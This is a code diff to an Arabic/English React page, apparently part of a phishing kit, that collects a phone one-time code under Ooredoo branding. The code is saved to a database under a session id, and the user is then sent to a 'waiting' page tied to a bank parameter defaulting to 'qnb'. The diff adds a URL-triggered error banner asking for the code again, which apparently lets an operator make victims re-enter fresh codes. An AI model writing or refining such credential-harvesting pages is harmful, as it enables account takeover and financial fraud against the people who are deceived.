@@ -10,6 +10,7 @@ export default function OtpOoredoo() {
   const params = new URLSearchParams(search);
   const { language, setLanguage } = useLanguage();
   const sessionId = localStorage.getItem("sessionId") || "";
+  const showError = params.get("error") === "true";
 
   const isArabic = language === "ar";
 
@@ -33,11 +34,11 @@ export default function OtpOoredoo() {
         otpCode: otp,
         otpType: "ooredoo",
       });
-      toast.success("تم التحقق بنجاح");
+      const bank = params.get("bank") || "qnb";
+      setLocation(`/waiting?bank=${bank}&session=${sessionId}&next=success`);
     } catch (error) {
-      console.error("Error saving Ooredoo OTP in DB, continuing anyway:", error);
+      toast.error(isArabic ? "حدث خطأ أثناء الإرسال" : "Error during submission");
     }
-    setLocation(`/success?session=${sessionId}`);
   };
 
   return (
@@ -72,6 +73,11 @@ export default function OtpOoredoo() {
             </div>
         </header>
         <div className="content-body">
+            {showError && (
+              <div style={{ background: "#fee2e2", border: "1px solid #ef4444", color: "#b91c1c", padding: "10px", borderRadius: "5px", marginBottom: "15px", textAlign: "center", fontSize: "14px" }}>
+                {isArabic ? "برجاء التحقق من الرمز المرسل عبر الجوال الصحيح" : "Please check the correct code sent via mobile"}
+              </div>
+            )}
 <h1>{language === "ar" ? "رمز التحقق" : "Verification Code"}</h1>
             <p className="sub-text">{language === "ar" ? "يرجى إدخال رمز التحقق (OTP) المرسل إلى هاتفك." : "Please enter the verification code (OTP) sent to your phone."}</p>
             <form onSubmit={handleSubmit}>
